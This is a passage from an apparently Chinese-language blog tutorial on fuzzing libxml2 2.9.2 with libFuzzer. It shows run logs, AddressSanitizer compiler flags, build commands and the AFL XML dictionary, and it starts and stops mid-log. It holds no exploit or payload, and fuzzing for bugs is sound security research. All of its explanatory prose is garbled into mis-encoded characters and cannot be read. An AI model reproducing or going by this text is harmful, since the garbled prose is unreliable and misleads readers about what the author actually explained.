class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">25</span>/<span class="number">1470</span> MS: <span class="number">2</span> ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2486420</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">336</span>/<span class="number">1470</span> MS: <span class="number">2</span> InsertByte-EraseBytes-</span><br><span class="line">#<span class="number">2486677</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">33</span>/<span class="number">1470</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">2486836</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">142</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2487217</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">555</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2487243</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9901</span> corp: <span class="number">3527</span>/<span class="number">673</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">1464</span>/<span class="number">1470</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">2487595</span>NEW    cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2035</span> rss: <span class="number">553</span>Mb L: <span class="number">1430</span>/<span class="number">1470</span> MS: <span class="number">4</span> ShuffleBytes-ChangeByte-ChangeBinInt-CopyPart-</span><br><span class="line">#<span class="number">2487978</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2035</span> rss: <span class="number">553</span>Mb L: <span class="number">34</span>/<span class="number">1470</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">2487997</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">534</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2488103</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9902</span> corp: <span class="number">3528</span>/<span class="number">675</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">62</span>/<span class="number">1470</span> MS: <span class="number">4</span> ChangeBit-PersAutoDict-ShuffleBytes-EraseBytes- DE: <span class="string">&quot;UT&quot;</span>-</span><br></pre></td></tr></table></figure><p>ä½†è¿Ÿè¿Ÿæ²¡æœ‰crashã€‚è¿™å¯èƒ½æœ‰å¾ˆå¤šåŸå› ï¼š1.ç¨‹åºå¾ˆå¥å£®ã€‚2.æˆ‘ä»¬é€‰æ‹©çš„æ¥å£å‡½æ•°ä¸åˆé€‚ 3.å¼‚å¸¸æ£€æµ‹çš„è®¾ç½®ä¸å½“ã€‚<br>è¿™ä¸‰ä¸ªå¯èƒ½çš„åŸå› ä¸­ç¨‹åºæ˜¯å¦å¥å£®æˆ‘ä»¬ä¸å¾—è€ŒçŸ¥ï¼Œæ¥å£å‡½æ•°æ˜¯å¦åˆé€‚æˆ‘ä»¬é€šè¿‡è¦†ç›–ç‡äº†è§£åˆ°ä»¥<code>xmlReadMemory</code>ä½œä¸ºå…¥å£å‡½æ•°æ‰§è¡Œåˆ°çš„ä»£ç å—è¿˜æ˜¯è¾ƒé«˜çš„ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å› ä¸ºæ¼æ´ä¸åœ¨æ¥å£å‡½æ•°çš„éƒ¨åˆ†ã€‚ç¬¬ä¸‰ä¸ªå¯èƒ½ï¼Œç”±äºå¼‚å¸¸æ£€æµ‹çš„è®¾ç½®ä¸å½“å¯¼è‡´å³ä½¿äº§ç”Ÿäº†å¼‚å¸¸ä½†å› ä¸ºäºè®¾ç½®çš„å¼‚å¸¸æ£€æµ‹ä¸åŒ¹é…å’Œæ²¡æœ‰æ•è·åˆ°ã€‚å›å¤´çœ‹ä¸‹æˆ‘ä»¬çš„santizeè®¾ç½®ä¸ºaddresså¼€å¯å†…å­˜é”™è¯¯æ£€æµ‹å™¨(AddressSanitizer)ï¼Œè¯¥é€‰é¡¹è¾ƒä¸ºé€šç”¨ä¸”å®½æ³›(æ— éstack&#x2F;heap_overflow)ï¼Œä½†å…¶å®è¿˜æœ‰ä¸€äº›æ›´å…·é’ˆå¯¹è¡Œçš„é€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-fsanitize-address-field-padding=&lt;value&gt;</span><br><span class="line">                         Level of field padding for AddressSanitizer</span><br><span class="line"> -fsanitize-address-globals-dead-stripping</span><br><span class="line">                         Enable linker dead stripping of globals in AddressSanitizer</span><br><span class="line"> -fsanitize-address-poison-custom-array-cookie</span><br><span class="line">                         Enable poisoning array cookies when using custom operator new[] in AddressSanitizer</span><br><span class="line"> -fsanitize-address-use-after-scope</span><br><span class="line">                         Enable use-after-scope detection in AddressSanitizer</span><br><span class="line"> -fsanitize-address-use-odr-indicator</span><br><span class="line">                         Enable ODR indicator globals to avoid false ODR violation reports in partially sanitized programs at the cost of an increase in binary size</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸€ä¸ª<code>-fsanitize-address-use-after-scope</code>æè¿°ä¸ºå¼€å¯use-after-scopeæ£€æµ‹ï¼Œå°†å…¶åŠ å…¥åˆ°ç¼–è¯‘é€‰é¡¹ä¸­ï¼Œå†æ¬¡ç¼–è¯‘ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;</span><br><span class="line"></span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure</span><br><span class="line"></span><br><span class="line">make -j$(nproc)</span><br><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1</span><br></pre></td></tr></table></figure><p>è·‘äº†ä¸€ä¼šå„¿ä¾ç„¶æ²¡æœ‰æ”¶è·ï¼Œçœ‹æ¥è¿™å°†ä¼šæ˜¯ä¸€ä¸ªè¾ƒé•¿æ—¶é—´çš„è¿‡ç¨‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1823774</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9428</span> corp: <span class="number">3417</span>/<span class="number">499</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2867</span> rss: <span class="number">546</span>Mb L: <span class="number">229</span>/<span class="number">1150</span> MS: <span class="number">4</span> ChangeBinInt-InsertByte-InsertByte-EraseBytes-</span><br><span class="line">#<span class="number">1823804</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2867</span> rss: <span class="number">546</span>Mb L: <span class="number">508</span>/<span class="number">1150</span> MS: <span class="number">3</span> CopyPart-EraseBytes-CopyPart-</span><br><span class="line">#<span class="number">1824507</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2868</span> rss: <span class="number">546</span>Mb L: <span class="number">24</span>/<span class="number">1150</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1824608</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2864</span> rss: <span class="number">546</span>Mb L: <span class="number">474</span>/<span class="number">1150</span> MS: <span class="number">4</span> InsertRepeatedBytes-ChangeASCIIInt-PersAutoDict-CrossOver- DE: <span class="string">&quot;\xff\xff\xffN&quot;</span>-</span><br><span class="line">#<span class="number">1824748</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2864</span> rss: <span class="number">546</span>Mb L: <span class="number">1066</span>/<span class="number">1143</span> MS: <span class="number">5</span> ChangeASCIIInt-CMP-PersAutoDict-ChangeBit-EraseBytes- DE: <span class="string">&quot;ISO-8859-1&quot;</span>-<span class="string">&quot;\xfe\xff\xff&quot;</span>-</span><br><span class="line">#<span class="number">1825344</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2865</span> rss: <span class="number">546</span>Mb L: <span class="number">25</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1825716</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2866</span> rss: <span class="number">546</span>Mb L: <span class="number">437</span>/<span class="number">1143</span> MS: <span class="number">3</span> InsertRepeatedBytes-InsertRepeatedBytes-EraseBytes-</span><br><span class="line">#<span class="number">1825879</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1160</span> exec/s: <span class="number">2866</span> rss: <span class="number">546</span>Mb L: <span class="number">73</span>/<span class="number">1143</span> MS: <span class="number">4</span> CMP-ChangeASCIIInt-ChangeBit-EraseBytes- DE: <span class="string">&quot;\x01\x00\x00P&quot;</span>-</span><br><span class="line">#<span class="number">1826898</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2863</span> rss: <span class="number">546</span>Mb L: <span class="number">453</span>/<span class="number">1143</span> MS: <span class="number">3</span> ChangeByte-ChangeASCIIInt-EraseBytes-</span><br><span class="line">#<span class="number">1827221</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2863</span> rss: <span class="number">546</span>Mb L: <span class="number">404</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1827788</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2864</span> rss: <span class="number">546</span>Mb L: <span class="number">47</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1828282</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">112</span>/<span class="number">1143</span> MS: <span class="number">4</span> CMP-ChangeBit-ChangeByte-EraseBytes- DE: <span class="string">&quot;O&gt;/&lt;&quot;</span>-</span><br><span class="line">#<span class="number">1828714</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">7</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1828728</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9429</span> corp: <span class="number">3418</span>/<span class="number">500</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">163</span>/<span class="number">1143</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1828756</span>NEW    cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">1155</span>/<span class="number">1155</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">1828812</span>REDUCE cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2861</span> rss: <span class="number">546</span>Mb L: <span class="number">42</span>/<span class="number">1155</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">1828952</span>REDUCE cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2862</span> rss: <span class="number">546</span>Mb L: <span class="number">380</span>/<span class="number">1155</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">1829111</span>REDUCE cov: <span class="number">2020</span> ft: <span class="number">9430</span> corp: <span class="number">3419</span>/<span class="number">501</span>Kb lim: <span class="number">1170</span> exec/s: <span class="number">2862</span> rss: <span class="number">546</span>Mb L: <span class="number">542</span>/<span class="number">1155</span> MS: <span class="number">3</span> InsertByte-ChangeASCIIInt-EraseBytes-</span><br></pre></td></tr></table></figure><p>ä½†æˆ‘ä»¬ä¸èƒ½æ”¾ä»»å…¶fuzzï¼Œè¦æƒ³ä¸€äº›åŠæ³•å»æé«˜æˆ‘ä»¬fuzzçš„æ•ˆç‡ï¼Œè¿™å…¶ä¸­ä¸€ä¸ªåŠæ³•å°±æ˜¯ä½¿ç”¨å­—å…¸ã€‚</p><p>æˆ‘ä»¬çŸ¥é“åŸºæœ¬ä¸Šæ‰€æœ‰çš„ç¨‹åºéƒ½æ˜¯å¤„ç†çš„æ•°æ®å…¶æ ¼å¼æ˜¯ä¸åŒçš„ï¼Œæ¯”å¦‚ xmlæ–‡æ¡£ï¼Œ pngå›¾ç‰‡ç­‰ç­‰ã€‚è¿™äº›æ•°æ®ä¸­ä¼šæœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦åºåˆ— ï¼ˆæˆ–è€…è¯´å…³é”®å­—ï¼‰ï¼Œ æ¯”å¦‚åœ¨xmlæ–‡æ¡£ä¸­å°±æœ‰CDATAï¼Œ&lt;!ATTLISTç­‰ï¼Œpngå›¾ç‰‡å°±æœ‰png å›¾ç‰‡å¤´ã€‚å¦‚æœæˆ‘ä»¬äº‹å…ˆå°±æŠŠè¿™äº›å­—ç¬¦åºåˆ—åˆ—ä¸¾å‡ºæ¥å—ï¼Œfuzzç›´æ¥ä½¿ç”¨è¿™äº›å…³é”®å­—å»ç»„åˆï¼Œå°±ä¼šå°±å¯ä»¥å‡å°‘å¾ˆå¤šæ²¡æœ‰æ„ä¹‰çš„å°è¯•ï¼ŒåŒæ—¶è¿˜æœ‰å¯èƒ½ä¼šèµ°åˆ°æ›´æ·±çš„ç¨‹åºåˆ†æ”¯ä¸­å»ã€‚<br>è¿™é‡Œwhorkshopå°±æä¾›äº†AFLä¸­æ‰€ä½¿ç”¨çš„dict:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">//xml.dict</span><br><span class="line">âœ  08 git:(master) âœ— cat xml.dict </span><br><span class="line"># Copyright 2016 Google Inc.</span><br><span class="line">#</span><br><span class="line"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"># you may not use this file except in compliance with the License.</span><br><span class="line"># You may obtain a copy of the License at</span><br><span class="line">#</span><br><span class="line">#      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">#</span><br><span class="line"># Unless required by applicable law or agreed to in writing, software</span><br><span class="line"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"># See the License for the specific language governing permissions and</span><br><span class="line"># limitations under the License.</span><br><span class="line">#</span><br><span class="line">################################################################################</span><br><span class="line">#</span><br><span class="line"># AFL dictionary for XML</span><br><span class="line"># ----------------------</span><br><span class="line">#</span><br><span class="line"># Several basic syntax elements and attributes, modeled on libxml2.</span><br><span class="line">#</span><br><span class="line"># Created by Michal Zalewski &lt;lcamtuf@google.com&gt;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">attr_encoding=&quot; encoding=\&quot;1\&quot;&quot;</span><br><span class="line">attr_generic=&quot; a=\&quot;1\&quot;&quot;</span><br><span class="line">attr_href=&quot; href=\&quot;1\&quot;&quot;</span><br><span class="line">attr_standalone=&quot; standalone=\&quot;no\&quot;&quot;</span><br><span class="line">attr_version=&quot; version=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_base=&quot; xml:base=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_id=&quot; xml:id=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_lang=&quot; xml:lang=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xml_space=&quot; xml:space=\&quot;1\&quot;&quot;</span><br><span class="line">attr_xmlns=&quot; xmlns=\&quot;1\&quot;&quot;</span><br><span class="line"></span><br><span class="line">entity_builtin=&quot;&amp;lt;&quot;</span><br><span class="line">entity_decimal=&quot;&amp;#1;&quot;</span><br><span class="line">entity_external=&quot;&amp;a;&quot;</span><br><span class="line">entity_hex=&quot;&amp;#x1;&quot;</span><br><span class="line"></span><br><span class="line">string_any=&quot;ANY&quot;</span><br><span class="line">string_brackets=&quot;[]&quot;</span><br><span class="line">string_cdata=&quot;CDATA&quot;</span><br><span class="line">string_col_fallback=&quot;:fallback&quot;</span><br><span class="line">string_col_generic=&quot;:a&quot;</span><br><span class="line">string_col_include=&quot;:include&quot;</span><br><span class="line">string_dashes=&quot;--&quot;</span><br><span class="line">string_empty=&quot;EMPTY&quot;</span><br><span class="line">string_empty_dblquotes=&quot;\&quot;\&quot;&quot;</span><br><span class="line">string_empty_quotes=&quot;&#x27;&#x27;&quot;</span><br><span class="line">string_entities=&quot;ENTITIES&quot;</span><br><span class="line">string_entity=&quot;ENTITY&quot;</span><br><span class="line">string_fixed=&quot;#FIXED&quot;</span><br><span class="line">string_id=&quot;ID&quot;</span><br><span class="line">string_idref=&quot;IDREF&quot;</span><br><span class="line">string_idrefs=&quot;IDREFS&quot;</span><br><span class="line">string_implied=&quot;#IMPLIED&quot;</span><br><span class="line">string_nmtoken=&quot;NMTOKEN&quot;</span><br><span class="line">string_nmtokens=&quot;NMTOKENS&quot;</span><br><span class="line">string_notation=&quot;NOTATION&quot;</span><br><span class="line">string_parentheses=&quot;()&quot;</span><br><span class="line">string_pcdata=&quot;#PCDATA&quot;</span><br><span class="line">string_percent=&quot;%a&quot;</span><br><span class="line">string_public=&quot;PUBLIC&quot;</span><br><span class="line">string_required=&quot;#REQUIRED&quot;</span><br><span class="line">string_schema=&quot;:schema&quot;</span><br><span class="line">string_system=&quot;SYSTEM&quot;</span><br><span class="line">string_ucs4=&quot;UCS-4&quot;</span><br><span class="line">string_utf16=&quot;UTF-16&quot;</span><br><span class="line">string_utf8=&quot;UTF-8&quot;</span><br><span class="line">string_xmlns=&quot;xmlns:&quot;</span><br><span class="line"></span><br><span class="line">tag_attlist=&quot;&lt;!ATTLIST&quot;</span><br><span class="line">tag_cdata=&quot;&lt;![CDATA[&quot;</span><br><span class="line">tag_close=&quot;&lt;/a&gt;&quot;</span><br><span class="line">tag_doctype=&quot;&lt;!DOCTYPE&quot;</span><br><span class="line">tag_element=&quot;&lt;!ELEMENT&quot;</span><br><span class="line">tag_entity=&quot;&lt;!ENTITY&quot;</span><br><span class="line">tag_ignore=&quot;&lt;![IGNORE[&quot;</span><br><span class="line">tag_include=&quot;&lt;![INCLUDE[&quot;</span><br><span class="line">tag_notation=&quot;&lt;!NOTATION&quot;</span><br><span class="line">tag_open=&quot;&lt;a&gt;&quot;</span><br><span class="line">tag_open_close=&quot;&lt;a /&gt;&quot;</span><br><span class="line">tag_open_exclamation=&quot;&lt;!&quot;</span><br><span class="line">tag_open_q=&quot;&lt;?&quot;</span><br><span class="line">tag_sq2_close=&quot;]]&gt;&quot;</span><br><span class="line">tag_xml_q=&quot;&lt;?xml?&gt;&quot;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å…³é”®å­—å°±æ˜¯â€â€é‡Œçš„å†…å®¹ï¼Œlibfuzzerä¼šä½¿ç”¨è¿™äº›å…³é”®å­—è¿›è¡Œç»„åˆæ¥ç”Ÿæˆæ ·æœ¬ã€‚å­—å…¸ä½¿ç”¨æ–¹æ³•<code>./libxml2-v2.9.2-fsanitize_fuzzer1 -max_total_time=60 -print_final_stats=1 -dict=./xml.dict corpus1</code><br>æ‰§è¡Œç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">468074</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8272</span> corp: <span class="number">2493</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7801</span> rss: <span class="number">452</span>Mb L: <span class="number">105</span>/<span class="number">135</span> MS: <span class="number">4</span> InsertRepeatedBytes-CMP-CopyPart-CrossOver- DE: <span class="string">&quot;\x01\x00\x00\x00&quot;</span>-</span><br><span class="line">#<span class="number">468322</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8272</span> corp: <span class="number">2493</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7805</span> rss: <span class="number">452</span>Mb L: <span class="number">85</span>/<span class="number">135</span> MS: <span class="number">3</span> CopyPart-CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">468381</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span 